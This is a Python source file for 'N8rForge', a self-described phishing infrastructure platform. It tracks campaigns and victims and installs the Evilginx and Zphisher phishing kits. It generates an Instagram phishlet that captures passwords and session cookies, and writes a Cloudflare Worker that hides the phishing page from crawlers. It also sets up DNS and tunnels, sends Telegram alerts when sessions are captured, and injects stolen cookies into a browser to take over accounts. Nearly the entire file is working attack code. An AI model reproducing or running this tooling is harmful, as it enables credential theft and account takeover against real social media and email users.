#!/usr/bin/env python3
# N8rForge v1.0 - Advanced Phishing Infrastructure & Operations Platform
# Developed by NORmal8r
# Run as root on Ubuntu/Debian 22.04+

import os
import sys
import subprocess
import time
import json
import re
import sqlite3
import csv
import io
import shutil
import urllib.request
import urllib.error
from pathlib import Path
from datetime import datetime

# ── Dependency Auto-Installer ──────────────────────────────────────────────
DEPS = {"rich": "rich", "requests": "requests", "qrcode": "qrcode[pil]", "playwright": "playwright"}
for mod, pkg in DEPS.items():
    try:
        __import__(mod)
    except ImportError:
        print(f"[*] Installing {pkg}...")
        subprocess.run([sys.executable, "-m", "pip", "install", pkg, "--quiet"], check=False)

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.prompt import Prompt, Confirm, IntPrompt
    from rich.table import Table
    from rich.align import Align
    from rich.theme import Theme
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    from rich.syntax import Syntax
    from rich.columns import Columns
    from rich.rule import Rule
except ImportError:
    print("[-] Critical: rich library failed to install.")
    sys.exit(1)

import requests
import qrcode

# ── Theme & Console ────────────────────────────────────────────────────────
THEME = Theme({
    "info": "cyan", "warn": "yellow", "danger": "bold red",
    "ok": "bold green", "banner": "bold magenta", "dim": "dim white",
    "accent": "bold cyan", "hi": "bold yellow"
})
console = Console(theme=THEME)

DB_PATH = Path.home() / ".n8rforge" / "n8rforge.db"
CONFIG_DIR = Path.home() / ".n8rforge"

# ── Helpers ────────────────────────────────────────────────────────────────
def is_root(): return os.geteuid() == 0

def ensure_root():
    if not is_root():
        console.print("[danger]N8rForge must run as root. Use: sudo ./n8rforge.py[/danger]")
        sys.exit(1)

def run(cmd, shell=False, quiet=False, spinner_text=None):
    if spinner_text:
        with console.status(f"[info]{spinner_text}[/info]", spinner="dots"):
            return subprocess.run(cmd, shell=shell, capture_output=True, text=True)
    return subprocess.run(cmd, shell=shell, capture_output=True, text=True, stdout=subprocess.DEVNULL if quiet else None)

def pause(): console.print(); Prompt.ask("[dim]Press Enter to continue[/dim]", default="", show_default=False)

def toast(msg, style="ok"): console.print(f"[{style}]» {msg}[/{style}]")

# ── Database Layer ─────────────────────────────────────────────────────────
class DB:
    def __init__(self, path=DB_PATH):
        path.parent.mkdir(parents=True, exist_ok=True)
        self.path = path
        self._init()

    def conn(self):
        c = sqlite3.connect(self.path)
        c.row_factory = sqlite3.Row
        return c

    def _init(self):
        with self.conn() as c:
            c.executescript("""
            CREATE TABLE IF NOT EXISTS campaigns (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                platform TEXT NOT NULL,
                domain TEXT,
                status TEXT DEFAULT 'active',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS targets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign_id INTEGER NOT NULL,
                identifier TEXT NOT NULL,
                status TEXT DEFAULT 'pending',
                notes TEXT,
                captured_at TIMESTAMP,
                FOREIGN KEY(campaign_id) REFERENCES campaigns(id) ON DELETE CASCADE
            );
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign_id INTEGER,
                target_id INTEGER,
                platform TEXT,
                cookies TEXT,
                ip TEXT,
                user_agent TEXT,
                captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY(campaign_id) REFERENCES campaigns(id) ON DELETE SET NULL,
                FOREIGN KEY(target_id) REFERENCES targets(id) ON DELETE SET NULL
            );
            CREATE TABLE IF NOT EXISTS config (
                key TEXT PRIMARY KEY,
                value TEXT
            );
            """)

    def set_config(self, k, v):
        with self.conn() as c:
            c.execute("INSERT OR REPLACE INTO config (key, value) VALUES (?, ?)", (k, v))

    def get_config(self, k, default=None):
        with self.conn() as c:
            row = c.execute("SELECT value FROM config WHERE key=?", (k,)).fetchone()
            return row["value"] if row else default

db = DB()

# ── Campaign Manager ───────────────────────────────────────────────────────
def create_campaign():
    console.print(Rule("[accent]Create Campaign[/accent]"))
    name = Prompt.ask("Campaign name (e.g., IG_Wave_01)")
    platform = Prompt.ask("Target platform", choices=["instagram", "facebook", "twitter", "gmail", "other"], default="instagram")
    domain = Prompt.ask("Assigned domain (optional)", default="")
    try:
        with db.conn() as c:
            c.execute("INSERT INTO campaigns (name, platform, domain) VALUES (?, ?, ?)", (name, platform, domain))
        toast(f"Campaign '{name}' created.")
    except sqlite3.IntegrityError:
        toast(f"Campaign '{name}' already exists.", "danger")

def list_campaigns():
    with db.conn() as c:
        rows = c.execute("""
            SELECT c.*, 
                   (SELECT COUNT(*) FROM targets WHERE campaign_id=c.id) AS t_count,
                   (SELECT COUNT(*) FROM sessions WHERE campaign_id=c.id) AS s_count
            FROM campaigns c ORDER BY c.id DESC
        """).fetchall()
    if not rows:
        toast("No campaigns yet.", "warn"); return []
    t = Table(title="Campaigns", border_style="cyan")
    t.add_column("ID", justify="right", style="dim")
    t.add_column("Name", style="accent")
    t.add_column("Platform")
    t.add_column("Domain", style="dim")
    t.add_column("Status")
    t.add_column("Targets", justify="right")
    t.add_column("Sessions", justify="right", style="ok")
    t.add_column("Created", style="dim")
    for r in rows:
        t.add_row(str(r["id"]), r["name"], r["platform"], r["domain"] or "-", r["status"],
                  str(r["t_count"]), str(r["s_count"]), r["created_at"][:16])
    console.print(t)
    return rows

def select_campaign(prompt_text="Select Campaign"):
    rows = list_campaigns()
    if not rows: return None
    cid = IntPrompt.ask(prompt_text)
    for r in rows:
        if r["id"] == cid: return r
    toast("Invalid ID.", "danger"); return None

# ── Targets Manager ────────────────────────────────────────────────────────
def import_targets():
    camp = select_campaign()
    if not camp: return
    console.print("[dim]Paste identifiers (email/username), one per line. Empty line to finish.[/dim]")
    count = 0
    with db.conn() as c:
        while True:
            line = input("> ").strip()
            if not line: break
            try:
                c.execute("INSERT INTO targets (campaign_id, identifier) VALUES (?, ?)", (camp["id"], line))
                count += 1
            except Exception as e:
                console.print(f"[danger]{e}[/danger]")
    toast(f"{count} targets imported to '{camp['name']}'.")

def import_targets_csv():
    camp = select_campaign()
    if not camp: return
    path = Prompt.ask("Path to CSV (one column: identifier)")
    try:
        count = 0
        with open(path, newline="") as f, db.conn() as c:
            for row in csv.reader(f):
                if row and row[0].strip():
                    c.execute("INSERT INTO targets (campaign_id, identifier) VALUES (?, ?)", (camp["id"], row[0].strip()))
                    count += 1
        toast(f"{count} targets imported from CSV.")
    except Exception as e:
        toast(f"CSV import failed: {e}", "danger")

def list_targets():
    camp = select_campaign()
    if not camp: return
    with db.conn() as c:
        rows = c.execute("SELECT * FROM targets WHERE campaign_id=? ORDER BY id DESC", (camp["id"],)).fetchall()
    if not rows:
        toast("No targets.", "warn"); return
    t = Table(title=f"Targets — {camp['name']}", border_style="cyan")
    t.add_column("ID", justify="right", style="dim")
    t.add_column("Identifier", style="accent")
    t.add_column("Status")
    t.add_column("Captured", style="dim")
    for r in rows:
        style = {"pending": "dim", "sent": "info", "clicked": "warn", "captured": "ok"}.get(r["status"], "")
        t.add_row(str(r["id"]), r["identifier"], f"[{style}]{r['status']}[/{style}]", r["captured_at"] or "-")
    console.print(t)

# ── Infrastructure: Dependencies ───────────────────────────────────────────
def install_deps():
    pkgs = ["git", "curl", "wget", "python3-pip", "golang-go", "make",
            "build-essential", "php", "sqlite3", "qrencode", "jq"]
    with console.status("[info]Installing system dependencies...[/info]", spinner="dots"):
        subprocess.run("apt-get update -y", shell=True, capture_output=True)
        subprocess.run(f"DEBIAN_FRONTEND=noninteractive apt-get install -y {' '.join(pkgs)}",
                       shell=True, capture_output=True)
    toast("System dependencies installed.")

# ── Infrastructure: Evilginx ───────────────────────────────────────────────
EVILGINX_DIR = Path("/opt/evilginx2")

def install_evilginx():
    if (EVILGINX_DIR / "evilginx").exists():
        toast("Evilginx already installed.", "warn"); return
    install_deps()
    with console.status("[info]Cloning Evilginx3...[/info]", spinner="dots"):
        subprocess.run("git clone https://github.com/kgretzky/evilginx2 /opt/evilginx2",
                       shell=True, capture_output=True)
    with console.status("[info]Compiling Evilginx...[/info]", spinner="dots"):
        subprocess.run("make", shell=True, cwd=EVILGINX_DIR, capture_output=True)
    if (EVILGINX_DIR / "evilginx").exists():
        toast("Evilginx installed at /opt/evilginx2")
    else:
        toast("Evilginx build failed. Check /opt/evilginx2.", "danger")

def generate_instagram_phishlet():
    if not EVILGINX_DIR.exists():
        toast("Install Evilginx first.", "danger"); return
    phishlet_dir = EVILGINX_DIR / "phishlets"
    phishlet_dir.mkdir(parents=True, exist_ok=True)
    domain = Prompt.ask("Domain hosting this phishlet (e.g., login.example.com)")
    content = f"""authori: '@NORmal8r'
min_ver: '3.0.0'
proxy_hosts:
  - {{phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true}}
  - {{phish_sub: 'instagram', orig_sub: '', domain: 'instagram.com', session: false, is_landing: false}}
  - {{phish_sub: 'i', orig_sub: 'i', domain: 'instagram.com', session: false, is_landing: false}}
  - {{phish_sub: 'graph', orig_sub: 'graph', domain: 'instagram.com', session: false, is_landing: false}}
sub_filters:
  - {{triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: 'https://{{hostname}}', replace: 'https://{{hostname}}', mimes: ['text/html', 'application/json']}}
auth_tokens:
  - domain: '.instagram.com'
    keys: ['sessionid', 'csrftoken', 'ds_user_id', 'mid']
credentials:
  username: {{key: 'username', search: '(.*)', type: 'post'}}
  password: {{key: 'password', search: '(.*)', type: 'post'}}
login:
  domain: 'www.instagram.com'
  path: '/accounts/login/'
"""
    (phishlet_dir / "instagram.yaml").write_text(content)
    toast(f"Phishlet generated: {phishlet_dir / 'instagram.yaml'}")
    toast(f"Enable with: phishlets hostname instagram {domain}")

# ── Infrastructure: Zphisher ───────────────────────────────────────────────
ZPHISHER_DIR = Path("/opt/zphisher")

def install_zphisher():
    if ZPHISHER_DIR.exists():
        toast("Zphisher already installed.", "warn"); return
    install_deps()
    with console.status("[info]Cloning Zphisher...[/info]", spinner="dots"):
        subprocess.run("git clone https://github.com/htr-tech/zphisher /opt/zphisher",
                       shell=True, capture_output=True)
        subprocess.run("chmod +x /opt/zphisher/zphisher.sh", shell=True, capture_output=True)
    toast("Zphisher installed at /opt/zphisher")

# ── Cloudflare Manager ─────────────────────────────────────────────────────
class Cloudflare:
    def __init__(self, token):
        self.h = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

    def _req(self, method, ep, data=None):
        url = f"https://api.cloudflare.com/client/v4/{ep}"
        r = requests.Request(method, url, headers=self.h, json=data)
        try:
            with requests.Session().send(r.prepare()) as resp:
                j = resp.json()
                if not j.get("success"): raise Exception(j.get("errors"))
                return j.get("result")
        except Exception as e:
            toast(f"Cloudflare API error: {e}", "danger"); return None

    def zone_id(self, domain):
        z = self._req("GET", f"zones?name={domain}")
        return z[0]["id"] if z else None

    def create_a(self, zone_id, name, ip, proxied=True):
        return self._req("POST", f"zones/{zone_id}/dns_records", {
            "type": "A", "name": name, "content": ip, "ttl": 1, "proxied": proxied
        })

def cloudflare_dns():
    console.print(Rule("[accent]Cloudflare DNS Automation[/accent]"))
    token = db.get_config("cf_token") or Prompt.ask("Cloudflare API Token", password=True)
    if not token: return
    db.set_config("cf_token", token)
    domain = Prompt.ask("Root domain")
    cf = Cloudflare(token)
    zid = cf.zone_id(domain)
    if not zid: return
    sub = Prompt.ask("Subdomain (e.g., login)")
    ip = Prompt.ask("VPS Public IP")
    proxied = Confirm.ask("Enable Cloudflare Proxy (orange cloud)?", default=True)
    res = cf.create_a(zid, f"{sub}.{domain}", ip, proxied)
    if res: toast(f"DNS record created: {sub}.{domain} → {ip} (proxied={proxied})")

def cloudflare_tunnel():
    console.print(Rule("[accent]Cloudflare Tunnel Setup[/accent]"))
    binary = Path("/usr/local/bin/cloudflared")
    if not binary.exists():
        with console.status("[info]Downloading cloudflared...[/info]"):
            subprocess.run("curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /usr/local/bin/cloudflared", shell=True)
            subprocess.run("chmod +x /usr/local/bin/cloudflared", shell=True)
    console.print("[warn]Open the auth URL, login, and select your domain.[/warn]")
    Prompt.ask("Press Enter to start authentication", default="", show_default=False)
    subprocess.run(["cloudflared", "tunnel", "login"])
    tunnel_name = Prompt.ask("Tunnel name", default="n8rforge")
    subprocess.run(["cloudflared", "tunnel", "create", tunnel_name])
    creds = Path.home() / ".cloudflared" / f"{tunnel_name}.json"
    if not creds.exists():
        toast("Tunnel creation failed.", "danger"); return
    uuid = json.loads(creds.read_text())["TunnelID"]
    domain = Prompt.ask("Domain to bind (e.g., login.example.com)")
    subprocess.run(["cloudflared", "tunnel", "route", "dns", tunnel_name, domain])
    port = Prompt.ask("Local port Evilginx listens on", default="8443")
    cfg = Path("/etc/cloudflared/config.yml")
    cfg.parent.mkdir(parents=True, exist_ok=True)
    cfg.write_text(f"""tunnel: {uuid}
credentials-file: /root/.cloudflared/{uuid}.json
ingress:
  - hostname: {domain}
    service: https://localhost:{port}
    originRequest:
      noTLSVerify: true
  - service: http_status:404
""")
    toast(f"Config written to {cfg}")
    if Confirm.ask("Install as systemd service?", default=True):
        subprocess.run("cloudflared service install", shell=True)
        subprocess.run("systemctl enable --now cloudflared", shell=True)
        toast("Cloudflare Tunnel active.")

# ── Cloaking Worker ────────────────────────────────────────────────────────
def generate_cloaking_worker():
    worker = """// Cloudflare Worker — Cloaking (N8rForge)
// Developed by NORmal8r
export default {
  async fetch(request) {
    const ua = (request.headers.get('User-Agent') || '').toLowerCase();
    const bots = ['googlebot','bingbot','slurp','duckduckbot','baiduspider','yandexbot',
                  'sogou','exabot','facebot','facebookexternalhit','twitterbot','linkedinbot',
                  'ahrefsbot','semrushbot','mj12bot','dotbot'];
    if (bots.some(b => ua.includes(b))) {
      return new Response('<html><body><h1>404 Not Found</h1></body></html>', {
        headers: { 'Content-Type': 'text/html' }, status: 404
      });
    }
    return fetch(request);
  }
}"""
    out = Path("cloaking_worker.js")
    out.write_text(worker)
    toast(f"Cloaking worker saved to {out.resolve()}")
    console.print(Syntax(worker, "javascript", theme="monokai", line_numbers=False))

# ── QR Generator ───────────────────────────────────────────────────────────
def generate_qr():
    url = Prompt.ask("URL to encode")
    name = Prompt.ask("Output filename", default="qr_target.png")
    img = qrcode.make(url)
    img.save(name)
    toast(f"QR saved to {Path(name).resolve()}")

# ── Telegram Notifier ──────────────────────────────────────────────────────
def send_telegram(msg):
    token = db.get_config("tg_token")
    chat = db.get_config("tg_chat")
    if not token or not chat: return False
    try:
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
                      json={"chat_id": chat, "text": msg, "parse_mode": "Markdown"}, timeout=10)
        return True
    except Exception:
        return False

def configure_telegram():
    console.print(Rule("[accent]Telegram Bot Configuration[/accent]"))
    token = Prompt.ask("Bot Token (from @BotFather)")
    chat = Prompt.ask("Chat ID (your user ID)")
    db.set_config("tg_token", token)
    db.set_config("tg_chat", chat)
    if send_telegram("*N8rForge* connected ✅"):
        toast("Telegram configured and tested.")
    else:
        toast("Saved, but test message failed.", "warn")

# ── Session Harvester & Cookie Injector ────────────────────────────────────
def add_session_manual():
    camp = select_campaign()
    if not camp: return
    console.print("[dim]Paste session cookies JSON (from Evilginx log or browser extension).[/dim]")
    raw = input("> ").strip()
    with db.conn() as c:
        c.execute("INSERT INTO sessions (campaign_id, platform, cookies) VALUES (?, ?, ?)",
                  (camp["id"], camp["platform"], raw))
    toast("Session stored.")
    send_telegram(f"🍪 *New session captured*\nCampaign: `{camp['name']}`")

def list_sessions():
    with db.conn() as c:
        rows = c.execute("""
            SELECT s.*, c.name AS cname FROM sessions s
            LEFT JOIN campaigns c ON s.campaign_id=c.id ORDER BY s.id DESC
        """).fetchall()
    if not rows:
        toast("No sessions captured.", "warn"); return []
    t = Table(title="Captured Sessions", border_style="cyan")
    t.add_column("ID", justify="right", style="dim")
    t.add_column("Campaign", style="accent")
    t.add_column("Platform")
    t.add_column("Cookies", max_width=40, style="dim")
    t.add_column("Captured", style="dim")
    for r in rows:
        t.add_row(str(r["id"]), r["cname"] or "-", r["platform"] or "-",
                  (r["cookies"] or "")[:40] + "...", r["captured_at"])
    console.print(t)
    return rows

def inject_cookies():
    rows = list_sessions()
    if not rows: return
    sid = IntPrompt.ask("Session ID to inject")
    target = next((r for r in rows if r["id"] == sid), None)
    if not target: toast("Invalid ID.", "danger"); return
    try:
        cookies = json.loads(target["cookies"])
    except Exception:
        toast("Invalid JSON in cookies field.", "danger"); return

    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        with console.status("[info]Installing Playwright...[/info]"):
            subprocess.run([sys.executable, "-m", "pip", "install", "playwright"], check=False)
            subprocess.run([sys.executable, "-m", "playwright", "install", "chromium"], check=False)
        from playwright.sync_api import sync_playwright

    url = {"instagram": "https://www.instagram.com",
           "facebook": "https://www.facebook.com",
           "twitter": "https://twitter.com",
           "gmail": "https://mail.google.com"}.get(target["platform"], "https://www.google.com")

    toast(f"Launching browser with {len(cookies)} cookies → {url}", "info")
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        ctx = browser.new_context()
        for ck in cookies:
            try:
                ctx.add_cookies([{
                    "name": ck.get("name"), "value": ck.get("value"),
                    "domain": ck.get("domain", ".instagram.com"), "path": "/"
                }])
            except Exception:
                pass
        page = ctx.new_page()
        page.goto(url)
        toast("Cookies injected. Browser is open.", "ok")
        Prompt.ask("Press Enter when finished", default="", show_default=False)
        browser.close()

# ── Launch ─────────────────────────────────────────────────────────────────
def launch_evilginx():
    if not (EVILGINX_DIR / "evilginx").exists():
        toast("Evilginx not installed.", "danger"); return
    domain = Prompt.ask("Evilginx domain (config domain)")
    os.chdir(EVILGINX_DIR)
    os.system(f"./evilginx -p ./phishlets -developer -t 3.0 -d {domain}")

def launch_zphisher():
    if not ZPHISHER_DIR.exists():
        toast("Zphisher not installed.", "danger"); return
    os.chdir(ZPHISHER_DIR)
    os.system("bash zphisher.sh")

# ── Dashboard ──────────────────────────────────────────────────────────────
def dashboard():
    with db.conn() as c:
        camps = c.execute("SELECT COUNT(*) AS n FROM campaigns").fetchone()["n"]
        targets = c.execute("SELECT COUNT(*) AS n FROM targets").fetchone()["n"]
        sessions = c.execute("SELECT COUNT(*) AS n FROM sessions").fetchone()["n"]
        captured = c.execute("SELECT COUNT(*) AS n FROM targets WHERE status='captured'").fetchone()["n"]
    t = Table(title="N8rForge Dashboard", border_style="magenta", show_header=False)
    t.add_row("[accent]Campaigns[/accent]", str(camps))
    t.add_row("[accent]Targets[/accent]", str(targets))
    t.add_row("[accent]Captured Sessions[/accent]", f"[ok]{sessions}[/ok]")
    t.add_row("[accent]Confirmed Compromises[/accent]", f"[ok]{captured}[/ok]")
    console.print(t)

# ── Banner ─────────────────────────────────────────────────────────────────
BANNER = """
 ███╗   ██╗ █████╗ ██████╗ ███╗   ███╗ █████╗ ██╗      █████╗ ██████╗ 
 ████╗  ██║██╔══██╗██╔══██╗████╗ ████║██╔══██╗██║     ██╔══██╗██╔══██╗
 ██╔██╗ ██║███████║██████╔╝██╔████╔██║███████║██║     ███████║██████╔╝
 ██║╚██╗██║██╔══██║██╔══██╗██║╚██╔╝██║██╔══██║██║     ██╔══██║██╔══██╗
 ██║ ╚████║██║  ██║██║  ██║██║ ╚═╝ ██║██║  ██║███████╗██║  ██║██║  ██║
 ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
                  [ Developed by NORmal8r • v1.0 ]
"""

def show_banner():
    console.print(Panel(Align.center(BANNER), border_style="magenta", padding=(0, 2)))

# ── Menus ──────────────────────────────────────────────────────────────────
def menu_main():
    t = Table(show_header=False, box=None, padding=(0, 2))
    t.add_row("[cyan]1[/cyan]", "Dashboard")
    t.add_row("[cyan]2[/cyan]", "Campaigns")
    t.add_row("[cyan]3[/cyan]", "Targets")
    t.add_row("[cyan]4[/cyan]", "Infrastructure")
    t.add_row("[cyan]5[/cyan]", "Phishing Assets")
    t.add_row("[cyan]6[/cyan]", "Delivery")
    t.add_row("[cyan]7[/cyan]", "Sessions")
    t.add_row("[cyan]8[/cyan]", "Launch")
    t.add_row("[cyan]9[/cyan]", "Settings")
    t.add_row("[cyan]0[/cyan]", "Exit")
    console.print(Panel(t, title="[accent]Main Menu[/accent]", border_style="cyan"))
    return Prompt.ask("Option", choices=[str(i) for i in range(10)], default="0")

def menu_campaigns():
    while True:
        console.print(Rule("[accent]Campaigns[/accent]"))
        choice = Prompt.ask("[1] Create  [2] List  [0] Back", default="0")
        if choice == "1": create_campaign()
        elif choice == "2": list_campaigns()
        elif choice == "0": return

def menu_targets():
    while True:
        console.print(Rule("[accent]Targets[/accent]"))
        choice = Prompt.ask("[1] Paste  [2] Import CSV  [3] List  [0] Back", default="0")
        if choice == "1": import_targets()
        elif choice == "2": import_targets_csv()
        elif choice == "3": list_targets()
        elif choice == "0": return

def menu_infrastructure():
    while True:
        console.print(Rule("[accent]Infrastructure[/accent]"))
        choice = Prompt.ask("[1] Install deps  [2] Install Evilginx  [3] Install Zphisher  "
                            "[4] Cloudflare DNS  [5] Cloudflare Tunnel  [0] Back", default="0")
        if choice == "1": install_deps()
        elif choice == "2": install_evilginx()
        elif choice == "3": install_zphisher()
        elif choice == "4": cloudflare_dns()
        elif choice == "5": cloudflare_tunnel()
        elif choice == "0": return

def menu_assets():
    while True:
        console.print(Rule("[accent]Phishing Assets[/accent]"))
        choice = Prompt.ask("[1] Instagram phishlet  [2] Cloaking worker  [0] Back", default="0")
        if choice == "1": generate_instagram_phishlet()
        elif choice == "2": generate_cloaking_worker()
        elif choice == "0": return

def menu_delivery():
    while True:
        console.print(Rule("[accent]Delivery[/accent]"))
        choice = Prompt.ask("[1] Generate QR  [2] Telegram test  [0] Back", default="0")
        if choice == "1": generate_qr()
        elif choice == "2": configure_telegram()
        elif choice == "0": return

def menu_sessions():
    while True:
        console.print(Rule("[accent]Sessions[/accent]"))
        choice = Prompt.ask("[1] Add manual  [2] List  [3] Inject cookies  [0] Back", default="0")
        if choice == "1": add_session_manual()
        elif choice == "2": list_sessions()
        elif choice == "3": inject_cookies()
        elif choice == "0": return

def menu_launch():
    while True:
        console.print(Rule("[accent]Launch[/accent]"))
        choice = Prompt.ask("[1] Evilginx  [2] Zphisher  [0] Back", default="0")
        if choice == "1": launch_evilginx()
        elif choice == "2": launch_zphisher()
        elif choice == "0": return

def menu_settings():
    while True:
        console.print(Rule("[accent]Settings[/accent]"))
        console.print(f"[dim]Cloudflare token: {'set' if db.get_config('cf_token') else 'unset'}[/dim]")
        console.print(f"[dim]Telegram bot: {'set' if db.get_config('tg_token') else 'unset'}[/dim]")
        choice = Prompt.ask("[1] Telegram  [2] Clear CF token  [0] Back", default="0")
        if choice == "1": configure_telegram()
        elif choice == "2": db.set_config("cf_token", ""); toast("Cleared.")
        elif choice == "0": return

# ── Main Loop ──────────────────────────────────────────────────────────────
def main():
    ensure_root()
    show_banner()
    while True:
        c = menu_main()
        if c == "1": dashboard()
        elif c == "2": menu_campaigns()
        elif c == "3": menu_targets()
        elif c == "4": menu_infrastructure()
        elif c == "5": menu_assets()
        elif c == "6": menu_delivery()
        elif c == "7": menu_sessions()
        elif c == "8": menu_launch()
        elif c == "9": menu_settings()
        elif c == "0":
            console.print("[dim]N8rForge exited. Stay sharp.[/dim]")
            break
        pause()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[warn]Interrupted.[/warn]")